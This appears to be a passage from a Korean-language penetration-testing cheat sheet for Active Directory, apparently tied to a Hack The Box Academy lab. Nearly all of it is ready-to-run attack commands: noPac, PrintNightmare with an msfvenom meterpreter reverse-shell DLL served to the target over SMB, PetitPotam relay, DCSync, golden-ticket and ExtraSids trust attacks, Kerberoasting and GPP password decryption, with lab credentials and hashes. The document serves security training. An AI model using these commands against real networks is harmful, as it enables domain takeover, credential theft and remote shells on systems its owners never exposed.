Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm -ConfigurationName  backupadmsess
klist
```

<br/><br/>
# AD 취약점 공격

## 1. NoPac(SamAccountName Spoofing)

### NoPac Exploit Repo 복제
```git clone https://github.com/Ridter/noPac.git```

### NoPac 스캐닝
```sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap```

### NoPac 실행 및 쉘 가져오기
```sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap```

### noPac을 사용하여 DCSync the Built-in Administrator Account
```sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator```

<br/><br/>
## 2. PrintNightmare

### 익스플로잇 복제
```git clone https://github.com/cube0x0/CVE-2021-1675.git```

### Impacket의 cube0x0 버전 설치 필요
```
pip3 uninstall impacket
git clone https://github.com/cube0x0/impacket
cd impacket
python3 ./setup.py install
```

### MS-RPRN에 대한 열거
```rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'```

### DLL 페이로드 생성
```msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll```

### smbserver.py로 공유 생성
```sudo smbserver.py -smb2support CompData /path/to/backupscript.dll```

### MSF multi/handler 구성 및 시작
```
[msf](Jobs:0 Agents:0) >> use exploit/multi/handler
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set PAYLOAD windows/x64/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LHOST 172.16.5.225
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LPORT 8080
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run
```

### Exploit 실행
```sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'```

<br/><br/>
## 3. PetitPotam (MS-EFSRPC)

### ntlmrelayx.py 시작
```sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController```

### PetitPotam.py 실행
```python3 PetitPotam.py 172.16.5.225 172.16.5.5```

### DC01에 대한 Base64 인코딩된 인증서 포착

### gettgtpkinit.py를 사용하여 TGT 요청하기
```python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY= dc01.ccache```

### KRB5CCNAME 환경 변수 설정
```export KRB5CCNAME=dc01.ccache```

### klist 실행
```klist```
> klist 명령 사용을 위한 패키지 : [krb5-user](https://packages.ubuntu.com/focal/krb5-user)

### 도메인 컨트롤러에 대한 관리자 액세스 확인
```crackmapexec smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf```

### getnthash.py를 사용하여 TGS 요청 제출
```python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$```

### 도메인 컨트롤러 NTLM 해시를 사용하여 DCSync
```secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba```

### DC01$ 머신 계정으로 TGT 요청 및 PTT 수행
```.\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:MIIStQIBAzC...SNIP...IkHS2vJ51Ry4= /ptt```

### 티켓이 메모리에 있는지 확인
```klist```

### Mimikatz로 DCSync 수행
```
.\mimikatz.exe
mimikatz # lsadump::dcsync /user:inlanefreight\krbtgt
```

<br/><br/>
# 기타 잘못된 구성

## 1. Printer Bug

### MS-PRN Printer Bug 열거
```
Import-Module .\SecurityAssessment.ps1
Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```

<br/><br/>
## 2. DNS 레코드 열거

### adidnsdump 사용
```adidnsdump -u inlanefreight\\forend ldap://172.16.5.5```

### -r 옵션을 사용하여 알 수 없는 레코드 Resolve
```adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r```

### records.csv 파일에서 숨겨진 레코드 찾기
```head records.csv```

<br/><br/>
## 3. 기타

### Get-Domain User를 사용하여 Description 필드에서 비밀번호 찾기
```Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}```

### Get-DomainUser를 사용하여 PASSWD_NOTREQD 설정 확인
```Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol```

### SMB 공유 및 SYSVOL 스크립트의 자격 증명
```ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts```

<br/><br/>
## 4. Group Policy Preferences (GPP) Passwords

###  SYSVOL 공유에 Groups.xml 보기

### gpp-decrypt로 비밀번호 해독하기
```gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE```

### CrackMapExec를 사용하여 GPP 비밀번호 찾기 및 검색
```crackmapexec smb -L | grep gpp```

### CrackMapExec의 gpp_autologin 모듈 사용
```crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin```

<br/><br/>
## 5. ASREPRoasting

### Get-DomainUser를 사용하여 DONT_REQ_PREAUTH 값 열거
```Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl```

### Rubeus를 사용하여 AS-REP Retrieving
```.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat```

### Hashcat으로 오프라인에서 해시 크래킹
```hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt```

### Kerbrute를 사용하여 AS-REP Retrieving
```kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt```

### Kerberoast 사전 인증이 필요하지 않은 사용자 헌팅
```GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users```

<br/><br/>
## 6. Group Policy Object (GPO) Abuse

### PowerView를 사용하여 GPO 이름 열거
```Get-DomainGPO |select displayname```

### 내장된 Cmdlet을 사용하여 GPO 이름 열거
```Get-GPO -All | Select DisplayName```

### 도메인 사용자 GPO 권한 열거
```
$sid=Convert-NameToSid "Domain Users"
Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}
```

### GPO GUID를 이름으로 변환
```Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532```

<br/><br/>
# Domain Trusts Primer

## 1. Trust Relationships 열거

### Get-ADTrust 사용하여 Trust Relationships 열거
```
Import-Module activedirectory
Get-ADTrust -Filter *
```

### Get-DomainTrust를 사용하여 기존 신뢰 확인
```Get-DomainTrust```

### Get-DomainTrustMapping 사용하여 신뢰 매핑
```
Import-Module .\PowerView.ps1
Get-DomainTrustMapping
```

### Get-DomainUser를 사용하여 자식 도메인의 사용자 확인
```Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName```

### netdom을 사용하여 domain trust 쿼리
```netdom query /domain:inlanefreight.local trust```

### netdom을 사용하여 도메인 컨트롤러 쿼리
```netdom query /domain:inlanefreight.local dc```

### netdom을 사용하여 워크스테이션 및 서버 쿼리
```netdom query /domain:inlanefreight.local workstation```

<br/><br/>
## 2. Attacking Domain Trusts - 자식 -> 부모 - from Windows

### ExtraSids Attack - Mimikatz

#### Mimikatz를 사용하여 KRBTGT 계정의 NT 해시 얻기
```mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt```

#### Get-DomainSID 사용
```
Import-Module .\PowerView.ps1
Get-DomainSID
```

#### Get-DomainGroup을 사용하여 Enterprise Admins 그룹의 SID 얻기
```Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid```

#### ls를 사용하여 액세스 불가 확인
```ls \\academy-ea-dc01.inlanefreight.local\c$```

#### Mimikatz로 골든 티켓 만들기
```
mimikatz.exe
mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
```

#### klist를 사용하여 Kerberos 티켓이 메모리에 있는지 확인
```klist```

#### 도메인 컨트롤러의 전체 C: 드라이브 나열
```ls \\academy-ea-dc01.inlanefreight.local\c$```

### ExtraSids Attack - Rubeus

#### Rubeus를 실행하기 전에 ls를 사용하여 액세스 불가 확인
```ls \\academy-ea-dc01.inlanefreight.local\c$```

#### Rubeus를 사용하여 골든 티켓 만들기
```.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt```

#### klist를 사용하여 티켓이 메모리에 있는지 확인
```klist```

#### DCSync 공격 수행
```
.\mimikatz.exe
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm
```
특정 도메인 대상 : ```mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL```

<br/><br/>
## 3. Attacking Domain Trusts - 자식 -> 부모 - from Linux

### secretsdump.py로 DCSync 수행
```secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt```

### lookupsid.py를 사용하여 SID Brute Forcing 수행
```lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240```

### 도메인 SID 찾기
```lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"```

### 도메인 SID를 잡고 Enterprise Admin의 RID에 연결
```lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"```

### ticketer.py를 사용하여 골든 티켓 구성
```ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker```

### KRB5CCNAME 환경 변수 설정
```export KRB5CCNAME=hacker.ccache```

### Impacket의 psexec.py를 사용하여 SYSTEM shell 가져오기
```psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5```

### raiseChild.py로 공격 수행(자동화, 필요시 사용)
```raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm```

<br/><br/>
## 4. Attacking Domain Trusts - Cross-Forest Trust Abuse - from Windows

### Cross-Forest Kerberoasting

#### Get-DomainUser를 사용하여 연관된 SPN에 대한 계정 열거
```Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName```

#### mssqlsvc 계정 열거
```Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof```

#### /domain 플래그를 사용하여 Rubeus로 Kerberoasting 공격 수행
```.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap```

### 관리자 비밀번호 재사용 및 그룹 멤버십

#### Get-DomainForeignGroupMember 사용하여 도메인에 속하지 않는 사용자가 있는 그룹 열거
```Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL```

#### Enter-PSSession을 사용하여 DC03에 액세스하기
```Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator```

<br/><br/>
## 5. Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux

### Cross-Forest Kerberoasting

#### GetUserSPNs.py 사용
```GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley```

#### -request 플래그 사용
```GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley```

### Bloodhound-python으로 Foreign Group Membership 헌팅

#### /etc/resolv.conf에 INLANEFREIGHT.LOCAL 정보 추가
```
cat /etc/resolv.conf

domain INLANEFREIGHT.LOCAL
nameserver 172.16.5.5
```

#### INLANEFREIGHT.LOCAL에 대한 bloodhound-python 실행
```bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2```

#### zip -r로 파일 압축
```zip -r ilfreight_bh.zip *.json```

#### /etc/resolv.conf에 FREIGHTLOGISTICS.LOCAL 정보 추가
```
cat /etc/resolv.conf

domain FREIGHTLOGISTICS.LOCAL
nameserver 172.16.5.238
```

#### FREIGHTLOGISTICS.LOCAL에 대해 bloodhound-python 실행
```bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2```

<br/><br/>
# AD Auditing Techniques

## 1. Active Directory Explorer를 사용하여 AD 스냅샷 만들기
[AD Explorer](https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer) : ```File --> Create Snapshot```

## 2. PingCastle
[PingCastle](https://www.pingcastle.com/documentation/) : ```실행 후 PingCastle Interactive TUI 옵션 선택```

## 3. Group3r
[Group3r](https://github.com/Group3r/Group3r) : ```group3r.exe -f <filepath-name.log>```

## 4. ADRecon
[ADRecon](https://github.com/adrecon/ADRecon) : ```.\ADRecon.ps1```








